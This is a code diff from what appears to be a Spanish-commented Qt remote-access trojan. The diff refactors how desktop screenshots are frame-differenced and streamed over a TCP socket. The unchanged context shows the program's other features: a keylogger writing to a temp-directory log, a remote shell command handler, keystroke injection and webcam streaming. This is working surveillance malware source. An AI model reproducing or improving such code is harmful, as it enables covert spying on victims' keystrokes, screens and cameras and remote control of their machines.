@@ -92,6 +92,7 @@ void MainWindow::inicio(){
     connect(&socketWebcam,SIGNAL(readyRead()),this,SLOT(llegadaDatosWebcam()));
     connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
     connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
+    connect(this,SIGNAL(procesar(QImage,int,QTcpSocket*)),&capturacion,SLOT(procesarImagen(QImage,int,QTcpSocket*)));
     QApplication::setQuitOnLastWindowClosed(false);
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     log.open(QFile::WriteOnly);
@@ -224,9 +225,6 @@ void MainWindow::llegadaDatos() {
         #ifdef Q_WS_WIN
              enviarTecla(parametros[1].toInt());
         #endif
-             if(socket.bytesAvailable())
-                 this->llegadaDatos();
-        return;
     }
     if(parametros[0] == "shell"){ //shell remoto
         QString salidaShell;
@@ -451,7 +449,7 @@ void MainWindow::llegadaDatosArchivo(){
 }
 void MainWindow::llegadaDatosEscritorio(){
     /** Función de petición de captura de escritorio **/
-        capturacion.procesarImagen(screenShot(),socketEscritorio.readAll().toInt(),&socketEscritorio);
+        emit procesar(screenShot().toImage(),socketEscritorio.readAll().toInt(),&socketEscritorio);
     }
 
 void MainWindow::llegadaDatosWebcam()
@@ -639,40 +637,36 @@ void MainWindow::escucharTeclas()
 
 paralelo::paralelo()
 {
-    captura1 = new QPixmap(QApplication::desktop()->width(),QApplication::desktop()->height());
-    captura1->fill(QColor(0,0,0).rgba());
+    imagen1 = new QImage(QApplication::desktop()->width(),QApplication::desktop()->height(),QImage::Format_RGB32);
+    imagen1->fill(QColor(0,0,0).rgba());
     sincroniza = 0;
 }
 
-void paralelo::procesarImagen(QPixmap captura, int calidad, QTcpSocket *socket)
+void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
 {
     this->socketDentro = socket;
     int i,j;
     buffer = new QBuffer(&bytes);
     connect(buffer,SIGNAL(bytesWritten(qint64)),this,SLOT(datosEscritos())); //Cuando los datos se terminen de escribir en el bufer llamamos a datosEscritos()
     buffer->open(QIODevice::ReadWrite);
-    QImage imagen1;
-    QImage imagen2;
-    imagen1 = captura1->toImage(); //Recojemos la captura anterior
-    imagen2 = captura.toImage(); //Almacenamos la nueva captura
     QImage imagen3(imagen2.width(),imagen2.height(), QImage::Format_RGB32); //Creamos una imagen nueva donde pintaremos los pixeles diferentes
     imagen3.fill(QColor(255, 0, 255).rgb()); //Inicializamos la imagen a fucsia para que envie la primera completa
-    for(i=0;i<captura1->width();i++) //Recorremos toda la imagen
+    for(i=0;i<imagen1->width();i++) //Recorremos toda la imagen
     {
-        for(j=0;j<captura1->height();j++)
+        for(j=0;j<imagen1->height();j++)
         {
-            if(imagen1.pixel(i,j) != imagen2.pixel(i,j)) //Si los pixeles son diferentes entonces se escriben en la nueva imagen
+            if(imagen1->pixel(i,j) != imagen2.pixel(i,j)) //Si los pixeles son diferentes entonces se escriben en la nueva imagen
             {
                 imagen3.setPixel(i,j,imagen2.pixel(i,j));
             }
         }
     }
     imagen3.save(buffer,"jpg",calidad); //Guardamos la imagen resultante en un bufer de memoria en formato jpg
-    *captura1 = captura; //La captura actual pasa a ser captura anterior
+    *imagen1 = imagen2; //La captura actual pasa a ser captura anterior
     sincroniza++; //LLebamos la cuenta de cuantas capturas vamos haciendo
     if(sincroniza == 10) //Cada 10 capturas envia una completa para sincronizar
     {
-        captura1->fill(QColor(0,0,0).rgba());
+        imagen1->fill(QColor(0,0,0).rgba());
         sincroniza = 0;
     }
 }
